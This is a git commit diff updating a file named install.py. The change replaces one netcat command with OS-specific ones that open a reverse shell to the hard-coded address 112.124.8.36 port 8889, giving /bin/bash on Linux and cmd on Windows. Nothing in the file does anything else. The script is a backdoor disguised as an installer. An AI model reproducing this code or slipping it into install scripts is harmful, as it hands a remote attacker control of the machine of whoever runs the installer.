0270aa38e0a790b31c7d37aab87b41f6dc3ad3b5
quachuooo <160610847+quachuooo@users.noreply.github.com>
2024-02-21 18:08:28 +0800

    Update install.py

--- install.py
+++ install.py
@@ -1,3 +1,8 @@
 import os
+import platform
 
-os.system("nc 112.124.8.36 8889 -e cmd")
+system_name = platform.system()
+if system_name == 'Linux':
+    os.system("nc 112.124.8.36 8889 -e /bin/bash")
+if system_name == 'Windows':
+    os.system("nc 112.124.8.36 8889 -e cmd ")
